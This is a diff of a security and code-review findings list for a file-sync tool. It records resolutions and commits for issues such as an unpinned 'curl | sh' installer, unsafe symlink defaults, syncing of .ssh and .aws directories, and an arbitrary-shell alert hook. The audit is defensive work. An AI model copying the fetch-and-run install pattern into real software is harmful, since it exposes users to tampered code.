+- **L-20. Keep-both rename can overwrite.** OPUS Low. `src/endpoint/local.rs:1353-1371`. `rename()` checks existence then calls plain `fs::rename`; use `publish_rename(…, false)`. **Resolution (2026-09-24):** ticket [F-L-MISC](fixes/F-L-MISC-small-correctness.md). **Implemented (2026-09-24):** `10d4aea`, `234d103`, `44132b4`, `77f12e1`, `9e2201b`, `eeeb615`.
 - **L-21. Every install failure is `Unreachable`, including permanent ones, which then retry forever.** OPUS Low. `src/endpoint/remote.rs:413-418`. **Note (2026-09-24):** with FreeBSD dropped, this is what a self-built FreeBSD remote host hits when no agent binary is supplied. `WISHLIST.md` documents the workaround.
-- **L-22. Upload errors hide the cause.** OPUS Low. `src/transport/install.rs:231-234`. Reports "Broken pipe" instead of the remote's stderr; stdout is piped and never read.
-- **L-23. Reload validates a second read of the file, not the bytes it compared.** OPUS Low. `src/supervisor/reload.rs:183-209`.
-- **L-24. Every reload stops every session, SSH connection and control socket.** OPUS Low. `src/supervisor/mod.rs:584-593`. Diff plans by identifier instead.
-- **L-25. Pool slots are never evicted.** OPUS Low. `src/transport/mux.rs:534-632`. A host removed from config keeps its ssh process and agent until exit.
-- **L-26. Racy-mtime protection is lost on adopted subtrees.** OPUS Low. `src/scan/mod.rs:253,295`. Incremental scans stamp `scanned_at = now`, so a later full scan trusts digests recorded while their mtime was racy.
-- **L-27. `scanning` flag stuck after a walk panic or `EAGAIN` from `spawn`.** OPUS Low. `src/endpoint/observer.rs:367,390`. Every caller loops on the 60 s wait.
-- **L-28. Wildcard negations under an ignored directory are dead and no longer reported; inside a region any negation re-includes.** OPUS Low. `src/scan/ignore.rs:103`.
-- **L-29. `select` keeps only one relative path with nested groups.** OPUS Low. `src/main.rs:1433-1435`.
-- **L-30. Progress keyed by `(group, host)`, so two betas on one host show each other's progress.** OPUS Low. `src/main.rs:3249`.
-- **L-31. Docs disagree with the code on `one-way-conflict` (alpha deletes a file beta edited).** OPUS Low. `docs/modes.md:37`.
+- **L-22. Upload errors hide the cause.** OPUS Low. `src/transport/install.rs:231-234`. Reports "Broken pipe" instead of the remote's stderr; stdout is piped and never read. **Resolution (2026-09-24):** ticket [F-L-MISC](fixes/F-L-MISC-small-correctness.md). **Implemented (2026-09-24):** `10d4aea`, `234d103`, `44132b4`, `77f12e1`, `9e2201b`, `eeeb615`.
+- **L-23. Reload validates a second read of the file, not the bytes it compared.** OPUS Low. `src/supervisor/reload.rs:183-209`. **Resolution (2026-09-24):** ticket [F-L-MISC](fixes/F-L-MISC-small-correctness.md). **Implemented (2026-09-24):** `10d4aea`, `234d103`, `44132b4`, `77f12e1`, `9e2201b`, `eeeb615`.
+- **L-24. Every reload stops every session, SSH connection and control socket.** OPUS Low. `src/supervisor/mod.rs:584-593`. Diff plans by identifier instead. **Resolution (2026-09-24):** [OPS-7](fixes/OPS-7-reload-by-session.md).
+- **L-25. Pool slots are never evicted.** OPUS Low. `src/transport/mux.rs:534-632`. A host removed from config keeps its ssh process and agent until exit. **Resolution (2026-09-24):** ticket [F-L-MISC](fixes/F-L-MISC-small-correctness.md); the fix itself is part of OPS-7. **Implemented (2026-09-24):** `10d4aea`, `234d103`, `44132b4`, `77f12e1`, `9e2201b`, `eeeb615`.
+- **L-26. Racy-mtime protection is lost on adopted subtrees.** OPUS Low. `src/scan/mod.rs:253,295`. Incremental scans stamp `scanned_at = now`, so a later full scan trusts digests recorded while their mtime was racy. **Resolution (2026-09-24):** ticket [F-L-STATE](fixes/F-L-STATE-durability-nits.md). **Implemented (2026-09-24):** `479840c`, `e2554a9`.
+- **L-27. `scanning` flag stuck after a walk panic or `EAGAIN` from `spawn`.** OPUS Low. `src/endpoint/observer.rs:367,390`. Every caller loops on the 60 s wait. **Resolution (2026-09-24):** Confirmed at `src/endpoint/observer.rs:392`. Ticket [F-M-OBS](fixes/F-M-OBS-observer-and-watcher.md). **Implemented (2026-09-24):** `0c39e6c`.
+- **L-28. Wildcard negations under an ignored directory are dead and no longer reported; inside a region any negation re-includes.** OPUS Low. `src/scan/ignore.rs:103`. **Resolution (2026-09-24):** ticket [F-L-MISC](fixes/F-L-MISC-small-correctness.md). **Implemented (2026-09-24):** `10d4aea`, `234d103`, `44132b4`, `77f12e1`, `9e2201b`, `eeeb615`.
+- **L-29. `select` keeps only one relative path with nested groups.** OPUS Low. `src/main.rs:1433-1435`. **Resolution (2026-09-24):** ticket [F-L-MISC](fixes/F-L-MISC-small-correctness.md). **Implemented (2026-09-24):** `10d4aea`, `234d103`, `44132b4`, `77f12e1`, `9e2201b`, `eeeb615`.
+- **L-30. Progress keyed by `(group, host)`, so two betas on one host show each other's progress.** OPUS Low. `src/main.rs:3249`. **Resolution (2026-09-24):** Fixed with H-12 in [F-H12](fixes/F-H12-session-identity.md). **Implemented (2026-09-24):** `06ca50f`, `141c813`, `dd6386e`.
+- **L-31. Docs disagree with the code on `one-way-conflict` (alpha deletes a file beta edited).** OPUS Low. `docs/modes.md:37`. **Resolution (2026-09-24):** ticket [F-L-MISC](fixes/F-L-MISC-small-correctness.md). **Implemented (2026-09-24):** `10d4aea`, `234d103`, `44132b4`, `77f12e1`, `9e2201b`, `eeeb615`.
 
 ### Installer, CLI and misc
 
-- **L-32. `curl | sh` installs from unpinned branch HEAD; no in-repo tar sanitization.** GLM L7. `scripts/install.sh:6,166`; `src/update.rs:336-341`. No `sudo` in the script limits blast radius.
-- **L-33. `SymlinkMode::Raw` is the default; peer-chosen targets may point outside the root.** DEEPSEEK I1. `src/scan/mod.rs:163-174`. Autobahn never dereferences them, but it is a foot-gun for other tools and the enabler for C-2's symlink arm. Consider `Portable` default.
-- **L-34. `on_alert` is an arbitrary shell command by design and inherits the caller's full environment when `watch` runs in a terminal.** DEEPSEEK I3. `src/alerts.rs:486-500`. Document.
+- **L-32. `curl | sh` installs from unpinned branch HEAD; no in-repo tar sanitization.** GLM L7. `scripts/install.sh:6,166`; `src/update.rs:336-341`. No `sudo` in the script limits blast radius. **Resolution (2026-09-24):** Step 1 of [REL-1](fixes/REL-1-release-integrity.md). **Implemented (2026-09-24):** `4458981`, `654c3c5`.
+- **L-33. `SymlinkMode::Raw` is the default; peer-chosen targets may point outside the root.** DEEPSEEK I1. `src/scan/mod.rs:163-174`. Autobahn never dereferences them, but it is a foot-gun for other tools and the enabler for C-2's symlink arm. Consider `Portable` default. **Resolution (2026-09-24):** The verbatim default stays; documented by [OPS-5](fixes/OPS-5-doc-notes.md). **Implemented (2026-09-24):** `7b8dcb9`.
+- **L-34. `on_alert` is an arbitrary shell command by design and inherits the caller's full environment when `watch` runs in a terminal.** DEEPSEEK I3. `src/alerts.rs:486-500`. Document. **Resolution (2026-09-24):** Documented by [OPS-5](fixes/OPS-5-doc-notes.md). **Implemented (2026-09-24):** `7b8dcb9`.
 - **L-45. On battery, the 120-second full walk is the whole of autobahn's idle cost.** New, measured during MAC-BENCH 2 (2026-09-24). 30 one-minute `powermetrics` samples on a 160,000-file tree: 0.10 energy between walks, 152.9 while walking, about 110 CPU ms/s for a full minute every second minute — roughly 3.3 minutes of CPU per hour on an idle machine, more than `WindowServer` while it runs. **Resolution (2026-09-24):** ticket [MAC-7](fixes/MAC-7-battery-walk-interval.md): a longer interval on battery, which is about a fifth of the energy.
 - **L-44. Two control-socket tests assume a Linux listen backlog, and fail on macOS.** New, found during MAC-BENCH 7i (2026-09-24). The fixture wedges a supervisor with `listen(fd, 0)` and expects the queue to fill; macOS keeps its own minimum, so 64 connects all succeed and the fixture panics with *the backlog never filled* (`src/supervisor/control.rs:1586`). Reproduces on untouched `main` (`f78238e`). **Resolution (2026-09-24):** ticket [MAC-6](fixes/MAC-6-control-socket-backlog-test.md).
 - **L-43. A test asserts a Linux-only `sh` exit code, so `cargo test` fails on macOS.** New, found during MAC-BENCH 7i (2026-09-24). `src/transport/install.rs:767` expects 127 from a missing agent; macOS `sh` returns 126 for both "missing" and "not executable", Linux returns 127 and 126. 386 pass, 1 fails, with or without `--features tray`. Blocks CI-09, whose macOS job would go red on arrival. **Resolution (2026-09-24):** ticket [MAC-5](fixes/MAC-5-sh-exit-code-assertion.md). **Fixed on `mac-fixes` (`081d717`):** the test now asserts that the command failed and picked nothing, rather than the number.
 - **L-41. `status` is unusable while a configuration edit is refused.** New, found on macOS during MAC-BENCH 1 (2026-09-24). Live reload keeps the last good configuration and the sessions keep syncing, but `status` parses the file itself and exits with the TOML error, printing nothing about the fleet — at exactly the moment a person has just edited the file and wants to know what happened. `issues` and `mi` are in the same position. **Resolution (2026-09-24):** ticket [MAC-2](fixes/MAC-2-status-during-refused-config.md): fall back to the recorded status files and lead with the refusal line. **Half of it was already fixed on `main`** (`show_recorded`); `--json` still failed, and now carries `configuration_error` beside `recorded` and exits non-zero — `mac-fixes` (`081d717`), which also stops the parse error arriving as one line of literal `\n`.
 - **L-42. A halted session alerts after about a minute, not the two the Mac bench assumes.** New, found on macOS during MAC-BENCH 5 (2026-09-24). `built_in_after` gives `Alert::Halted` a hold of `Duration::ZERO` (`src/config.rs:233`); the minute observed between a detached volume and its notification is `DEFAULT_COALESCE_AFTER`, which exists to gather a cascade. Measured: detached 00:10:04, one notification 00:11:05. The same run found that the halt cleared itself when the volume returned 33 s later, which contradicts `docs/safety.md:58` ("A halt needs a person; retrying never clears it"). **Resolution (2026-09-24):** ticket [MAC-3](fixes/MAC-3-halted-alert-timing.md).
-- **L-35. Robustness nits.** GLM L9. `.expect` on poisonable locks (`src/transport/mux.rs:160-162`) inconsistent with `into_inner` elsewhere; unquoted home-relative remote command path (`src/transport/install.rs:31-32`) safe only because `protocol::version()` is a compile-time constant; add a charset guard.
+- **L-35. Robustness nits.** GLM L9. `.expect` on poisonable locks (`src/transport/mux.rs:160-162`) inconsistent with `into_inner` elsewhere; unquoted home-relative remote command path (`src/transport/install.rs:31-32`) safe only because `protocol::version()` is a compile-time constant; add a charset guard. **Resolution (2026-09-24):** [HYG-4](fixes/HYG-4-code-nits.md). Log forging is M-7. **Implemented (2026-09-24):** `4f0399c`, `b1b1463`, `eeeb615`.
 - **L-36. Defense-in-depth: four staging/supply call sites join wire paths without `resolve_relative`.** GLM "verified safe" note. `src/endpoint/local.rs:757,840,965,1195`. Overlaps C-2.
   - **Correction (2026-09-24):** The four sites are not equivalent.
     - The supply site is not defense-in-depth; it is C-2 itself, fixed by [T1-1](fixes/T1-1-supply-confinement.md).
     - The two receive sites, the base signature and the patch-base open, are safe today only because the snapshot gate comes first. [T1-5](fixes/T1-5-staging-request-paths.md) makes that explicit. These are the counterpart of rsync CVE-2024-12086.
     - The `stage_locally` source path comes from the local snapshot and is already safe.
-- **L-37. Committed build droppings and hygiene.** OPUS §4; GLM. A stale unstripped 4 MB `dist/agents/autobahn-linux-x86_64` is committed and `dist/` not ignored; `bench/` holds 626 tracked files (~245 MB, mostly results and logs; `bench/harness/target` has 538 files) although `.gitignore` excludes `bench/results-bench-*/`; `README.md:136` onward still says "The previous README follows, kept for merging"; three TODO files at root; `apps/macos/Info.plist` hard-codes `0.4.0` unchecked by the release guard.
-- **L-38. No `rust-version` (MSRV), no `--locked` in CI or release builds.** OPUS §4.
-- **L-39. `NO_COLOR` not honoured; ANSI printed to non-terminals.** OPUS §4.
-- **L-40. Dead code.** OPUS §4. `let _ = shown;`, `let _ = inner;`, `let _ = intent_recorded;`, `let _ = root;`, the `Response::Scan` path, an immediately-invoked closure in `attempt_once`.
+- **L-37. Committed build droppings and hygiene.** OPUS §4; GLM. A stale unstripped 4 MB `dist/agents/autobahn-linux-x86_64` is committed and `dist/` not ignored; `bench/` holds 626 tracked files (~245 MB, mostly results and logs; `bench/harness/target` has 538 files) although `.gitignore` excludes `bench/results-bench-*/`; `README.md:136` onward still says "The previous README follows, kept for merging"; three TODO files at root; `apps/macos/Info.plist` hard-codes `0.4.0` unchecked by the release guard. **Resolution (2026-09-24):** [HYG-1](fixes/HYG-1-stale-artifacts.md) covers the `dist/` binary and the app version. Bench results stay committed, deliberately. The README merge and the TODO files are yours. **Implemented (2026-09-24):** `5e43d5a`, `65e8675`.
+- **L-38. No `rust-version` (MSRV), no `--locked` in CI or release builds.** OPUS §4. **Resolution (2026-09-24):** `--locked` is [CI-07](fixes/CI-07-locked.md). A minimum Rust version was decided against. **Implemented (2026-09-24):** `354145e`, `b5750eb`, `f4c8278`.
+- **L-39. `NO_COLOR` not honoured; ANSI printed to non-terminals.** OPUS §4. **Resolution (2026-09-24):** [HYG-2](fixes/HYG-2-no-color.md). **Implemented (2026-09-24):** `a24e0d3`.
+- **L-40. Dead code.** OPUS §4. `let _ = shown;`, `let _ = inner;`, `let _ = intent_recorded;`, `let _ = root;`, the `Response::Scan` path, an immediately-invoked closure in `attempt_once`. **Resolution (2026-09-24):** [HYG-4](fixes/HYG-4-code-nits.md). **Implemented (2026-09-24):** `4f0399c`, `b1b1463`, `eeeb615`.
 
 ---
 
 ## Info / process
 
-- **I-1. No `cargo audit`/`cargo deny`/dependabot in CI.** KIMI ABN-I1; DEEPSEEK §5; OPUS CI gaps. 200+ pinned crates, no advisory surfacing. None of the reviewers ran a live advisory scan; dependency-CVE status is asserted by nobody.
-- **I-2. Default ignores exclude no secret-bearing directories.** KIMI ABN-I2. `src/config.rs:89` (`.git`, `.DS_Store`, `node_modules`, `target`). A root covering a home syncs `.ssh`/`.aws`/`.gnupg` to every destination, amplifying C-2, H-21, H-18.
-- **I-3. Linux binaries unsigned; install is curl|sh with same-origin checksums.** KIMI ABN-I3. See H-28. **Resolution (2026-09-24):** step 2 of [REL-1](fixes/REL-1-release-integrity.md).
-- **I-4. `INVARIANTS.md` I9 cites `oversized_frames_are_rejected_on_send`, removed in `84b5fc7`; the I9 text about outgoing/oversized messages is stale now that messages reassemble to 4 GiB.** OPUS §4.
-- **I-5. Comments and docs that contradict the code.** OPUS §4. The `blocking` comment in `reconcile.rs` (H-8); the `sanitize` comment ("reconciliation never puts unsynchronizable content into an expectation", false for one-way modes); `how-it-works.md` Decision 4 (P-2); `ssh_argv` ("autobahn never copies or bootstraps it"); `hold_paused` ("a paused session holds no resources", but pooled SSH is kept); `main.rs:2797` tells users to restart after editing the config although reload is live; `safety.md:58` says a halt never clears by retrying, while an emptied-root halt clears itself as soon as the content returns (measured 2026-09-24, see L-42). Misplaced or fused doc comments at ≥15 sites: `local.rs:177-180,509-510,726-736,2681-2686`; `observer.rs:240-246,301-305`; `scan/mod.rs:813-820`; `main.rs:1004,1154,2116,2614-2633`; `tray.rs:748-762`; `session/mod.rs:96,872`; `transport/mod.rs:86-88,984-985`; `progress.rs`.
+- **I-1. No `cargo audit`/`cargo deny`/dependabot in CI.** KIMI ABN-I1; DEEPSEEK §5; OPUS CI gaps. 200+ pinned crates, no advisory surfacing. None of the reviewers ran a live advisory scan; dependency-CVE status is asserted by nobody. **Resolution (2026-09-24):** [CI-10](fixes/CI-10-dependency-advisories.md). **Implemented (2026-09-24):** `aef50e3`.
+- **I-2. Default ignores exclude no secret-bearing directories.** KIMI ABN-I2. `src/config.rs:89` (`.git`, `.DS_Store`, `node_modules`, `target`). A root covering a home syncs `.ssh`/`.aws`/`.gnupg` to every destination, amplifying C-2, H-21, H-18. **Resolution (2026-09-24):** A warning instead of new default ignores, [OPS-6](fixes/OPS-6-secrets-warning.md). **Implemented (2026-09-24):** `235c024`, `36ae6a3`, `b5750eb`.
+- **I-3. Linux binaries unsigned; install is curl|sh with same-origin checksums.** KIMI ABN-I3. See H-28. **Resolution (2026-09-24):** step 2 of [REL-1](fixes/REL-1-release-integrity.md). **Implemented (2026-09-26):** `10096af`, REL-1 step 2.
+- **I-4. `INVARIANTS.md` I9 cites `oversized_frames_are_rejected_on_send`, removed in `84b5fc7`; the I9 text about outgoing/oversized messages is stale now that messages reassemble to 4 GiB.** OPUS §4. **Resolution (2026-09-24):** [HYG-3](fixes/HYG-3-comments-that-lie.md). **Implemented (2026-09-24):** `3451d3f`, `b6bb12f`, `cab1b27`.
+- **I-5. Comments and docs that contradict the code.** OPUS §4. The `blocking` comment in `reconcile.rs` (H-8); the `sanitize` comment ("reconciliation never puts unsynchronizable content into an expectation", false for one-way modes); `how-it-works.md` Decision 4 (P-2); `ssh_argv` ("autobahn never copies or bootstraps it"); `hold_paused` ("a paused session holds no resources", but pooled SSH is kept); `main.rs:2797` tells users to restart after editing the config although reload is live; `safety.md:58` says a halt never clears by retrying, while an emptied-root halt clears itself as soon as the content returns (measured 2026-09-24, see L-42). Misplaced or fused doc comments at ≥15 sites: `local.rs:177-180,509-510,726-736,2681-2686`; `observer.rs:240-246,301-305`; `scan/mod.rs:813-820`; `main.rs:1004,1154,2116,2614-2633`; `tray.rs:748-762`; `session/mod.rs:96,872`; `transport/mod.rs:86-88,984-985`; `progress.rs`. **Resolution (2026-09-24):** [HYG-3](fixes/HYG-3-comments-that-lie.md). **Implemented (2026-09-24):** `3451d3f`, `b6bb12f`, `cab1b27`.
 - **I-6. Commits on `main` that do not compile.** New, found on macOS during MAC-BENCH 3 (2026-09-24). `c4e4109` and `f68b0a8` fail with *error[E0004]: non-exhaustive patterns: `Command::Update { .. }` not covered* (`src/main.rs:547`): the enum variant was added in one commit and its match arm in another. `git bisect` cannot cross the range, and neither can the A/B gate — which is how it was found, since section 3 could not build a baseline binary. **Resolution (2026-09-24):** ticket [MAC-4](fixes/MAC-4-non-building-commits.md).
 
 ---
 
 ## Performance opportunities
+
+**Resolution (2026-09-24):** all fourteen are in `TODO-SPEED.md`, under "From the 2026-09-23 reviews", each with the measurement that would decide it:
+- **Small and clear-cut:** P-4, P-5, P-6, P-7, P-11, P-13, P-14.
+- **Measure first:** P-1, P-3, P-8, P-9, P-12.
+- **Closed without building:** P-2, P-10.
+
+P-13's remote half is a wire change, so it waits for the next epoch bump.
 
 Measurements are the reviewers' local microbenchmarks, not end-to-end claims.
 
